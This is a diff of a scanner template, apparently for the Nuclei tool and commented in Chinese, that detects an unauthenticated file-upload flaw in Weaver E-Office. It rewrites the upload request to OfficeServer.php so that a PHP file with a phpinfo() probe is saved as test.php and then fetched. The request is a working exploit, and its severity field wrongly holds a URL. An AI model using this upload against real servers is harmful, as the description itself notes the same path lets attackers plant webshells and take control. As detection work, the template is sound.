@@ -1,10 +1,10 @@
-id: 泛微9.5E-Office OfficeServer.php 文件上传漏洞
-time:  "2023-05-23"
+id: 泛微E-Office OfficeServer.php 文件上传漏洞
+time:  "2022-12-08"
 
 info:
   name: 泛微KtreeUploadAction
-  severity: high
-  description:  泛微e-office 9.5版本，源文件 App/Ajax/ajax.php?action=mobile_upload_save 的一些未知功能存在问题。 参数 upload_quwan的操作导致不受限制的上传，未经身份验证的恶意攻击者通过上传恶意文件，从而获取目标服务器的控制权限。
+  severity: https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20OfficeServer.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  description: 泛微eoffice 10版本存在前台任意文件写入漏洞，攻击者可通过该漏洞上传webshell获取服务器权限。
   reference: 暂无
   metadata:
     max-request: 2
@@ -16,23 +16,23 @@ http:
       - POST
       - GET
     path:
-      - "{{BaseURL}}//E-mobile/App/Ajax/ajax.php?action=mobile_upload_save"
+      - "{{BaseURL}}/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
+      - "{{BaseURL}}/eoffice10/server/public/iWebOffice2015/Document/test.php"
     Rheader:
-      - Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 & Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt & Accept-Encoding:gzip, deflate & Origin:null &  Upgrade-Insecure-Requests:1
+      - Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryqhUtBPRUeNb5pjit & Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 &  Accept-Encoding:gzip, deflate & Upgrade-Insecure-Requests:1 & Origin:null
         
     body: 
       - |
-        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
-        Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
+        ------WebKitFormBoundaryqhUtBPRUeNb5pjit
+        Content-Disposition: form-data; name="FileData"; filename="1.jpg"
         Content-Type: image/jpeg
- 
-        <?php phpinfo();?>
-        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
-        Content-Disposition: form-data; name="file"; filename=""
-        Content-Type: application/octet-stream
- 
- 
-        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+
+        ik521<?php phpinfo();?>
+        ------WebKitFormBoundaryqhUtBPRUeNb5pjit
+        Content-Disposition: form-data; name="FormData"
+
+        {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
+        ------WebKitFormBoundaryqhUtBPRUeNb5pjit--
 
       
 
@@ -41,8 +41,7 @@ http:
       - type: word
         part: body
         words:
-          - "1.php"
-          - "eoffice"
+          - "ik521"
 
       - type: status
         status:
